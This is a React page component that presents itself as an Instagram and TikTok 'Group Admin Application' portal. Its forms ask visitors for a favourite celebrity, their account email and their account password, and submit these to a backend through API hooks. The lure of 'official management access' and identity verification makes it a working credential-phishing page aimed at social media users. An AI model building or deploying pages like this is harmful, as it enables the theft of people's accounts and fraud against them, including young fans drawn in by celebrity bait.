import React from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import * as z from "zod";
import { useToast } from "@/hooks/use-toast";
import {
  useSubmitInstagram,
  useSubmitTiktok,
} from "@workspace/api-client-react";

import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { SiInstagram, SiTiktok } from "react-icons/si";

const instagramSchema = z.object({
  favoriteCelebrity: z.string().min(1, "Favorite celebrity is required"),
  email: z.string().email("Invalid email address"),
  password: z.string().min(1, "Password is required"),
});

const tiktokSchema = z.object({
  favoriteCelebrity: z.string().min(1, "Favorite celebrity is required"),
  email: z.string().email("Invalid email address"),
  password: z.string().min(1, "Password is required"),
});

export default function Home() {
  const { toast } = useToast();

  const instagramForm = useForm<z.infer<typeof instagramSchema>>({
    resolver: zodResolver(instagramSchema),
    defaultValues: {
      favoriteCelebrity: "",
      email: "",
      password: "",
    },
  });

  const tiktokForm = useForm<z.infer<typeof tiktokSchema>>({
    resolver: zodResolver(tiktokSchema),
    defaultValues: {
      favoriteCelebrity: "",
      email: "",
      password: "",
    },
  });

  const submitInstagram = useSubmitInstagram({
    mutation: {
      onSuccess: () => {
        toast({
          title: "Application Submitted",
          description: "Your Instagram group admin application has been received.",
        });
        instagramForm.reset();
      },
      onError: (error) => {
        toast({
          title: "Submission Failed",
          description: "There was a problem submitting your application.",
          variant: "destructive",
        });
      },
    },
  });

  const submitTiktok = useSubmitTiktok({
    mutation: {
      onSuccess: () => {
        toast({
          title: "Application Submitted",
          description: "Your TikTok group admin application has been received.",
        });
        tiktokForm.reset();
      },
      onError: (error) => {
        toast({
          title: "Submission Failed",
          description: "There was a problem submitting your application.",
          variant: "destructive",
        });
      },
    },
  });

  const onInstagramSubmit = (values: z.infer<typeof instagramSchema>) => {
    submitInstagram.mutate({ data: values });
  };

  const onTiktokSubmit = (values: z.infer<typeof tiktokSchema>) => {
    submitTiktok.mutate({ data: values });
  };

  return (
    <div className="min-h-[100dvh] w-full flex flex-col items-center justify-center bg-zinc-50 dark:bg-zinc-950 p-4">
      <div className="max-w-md w-full">
        <div className="mb-8 text-center space-y-2">
          <h1 className="text-3xl font-bold tracking-tight text-zinc-900 dark:text-zinc-50">
            Group Admin Application
          </h1>
          <p className="text-zinc-500 dark:text-zinc-400">
            Apply for official management access to exclusive communities.
          </p>
        </div>

        <Tabs defaultValue="instagram" className="w-full">
          <TabsList className="grid w-full grid-cols-2 mb-6">
            <TabsTrigger value="instagram" className="data-[state=active]:text-pink-600 dark:data-[state=active]:text-pink-400 flex items-center gap-2">
              <SiInstagram /> Instagram
            </TabsTrigger>
            <TabsTrigger value="tiktok" className="data-[state=active]:text-teal-600 dark:data-[state=active]:text-teal-400 flex items-center gap-2">
              <SiTiktok /> TikTok
            </TabsTrigger>
          </TabsList>

          <TabsContent value="instagram">
            <Card className="border-t-4 border-t-pink-500 shadow-lg">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-xl">
                  <span className="bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-500 text-transparent bg-clip-text font-bold">
                    Instagram Admin Portal
                  </span>
                </CardTitle>
                <CardDescription>
                  Verify your identity to claim Instagram group admin rights.
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Form {...instagramForm}>
                  <form
                    onSubmit={instagramForm.handleSubmit(onInstagramSubmit)}
                    className="space-y-4"
                  >
                    <FormField
                      control={instagramForm.control}
                      name="favoriteCelebrity"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Your Favorite Celebrity Name</FormLabel>
                          <FormControl>
                            <Input placeholder="e.g. Selena Gomez" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={instagramForm.control}
                      name="email"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Instagram Gmail</FormLabel>
                          <FormControl>
                            <Input placeholder="e.g. user@gmail.com" type="email" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={instagramForm.control}
                      name="password"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Instagram Password</FormLabel>
                          <FormControl>
                            <Input placeholder="••••••••" type="password" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <Button
                      type="submit"
                      className="w-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-500 hover:opacity-90 text-white border-0"
                      disabled={submitInstagram.isPending}
                    >
                      {submitInstagram.isPending ? "Applying..." : "Apply Now"}
                    </Button>
                  </form>
                </Form>
              </CardContent>
            </Card>
          </TabsContent>

          <TabsContent value="tiktok">
            <Card className="border-t-4 border-t-teal-400 shadow-lg">
              <CardHeader>
                <CardTitle className="flex items-center gap-2 text-xl">
                  <span className="font-bold text-zinc-900 dark:text-white drop-shadow-[2px_2px_0px_#24f6f0,-2px_-2px_0px_#ff0050]">
                    TikTok Admin Portal
                  </span>
                </CardTitle>
                <CardDescription>
                  Verify your identity to claim TikTok group admin rights.
                </CardDescription>
              </CardHeader>
              <CardContent>
                <Form {...tiktokForm}>
                  <form
                    onSubmit={tiktokForm.handleSubmit(onTiktokSubmit)}
                    className="space-y-4"
                  >
                    <FormField
                      control={tiktokForm.control}
                      name="favoriteCelebrity"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>Your Favorite Celebrity Name</FormLabel>
                          <FormControl>
                            <Input placeholder="e.g. Charli D'Amelio" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={tiktokForm.control}
                      name="email"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>TikTok Email/Gmail</FormLabel>
                          <FormControl>
                            <Input placeholder="e.g. user@gmail.com" type="email" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <FormField
                      control={tiktokForm.control}
                      name="password"
                      render={({ field }) => (
                        <FormItem>
                          <FormLabel>TikTok Password</FormLabel>
                          <FormControl>
                            <Input placeholder="••••••••" type="password" {...field} />
                          </FormControl>
                          <FormMessage />
                        </FormItem>
                      )}
                    />
                    <Button
                      type="submit"
                      className="w-full bg-zinc-900 hover:bg-zinc-800 text-white dark:bg-white dark:hover:bg-zinc-200 dark:text-zinc-900 shadow-[2px_2px_0px_#24f6f0,-2px_-2px_0px_#ff0050] border-0"
                      disabled={submitTiktok.isPending}
                    >
                      {submitTiktok.isPending ? "Applying..." : "Apply Now"}
                    </Button>
                  </form>
                </Form>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
}
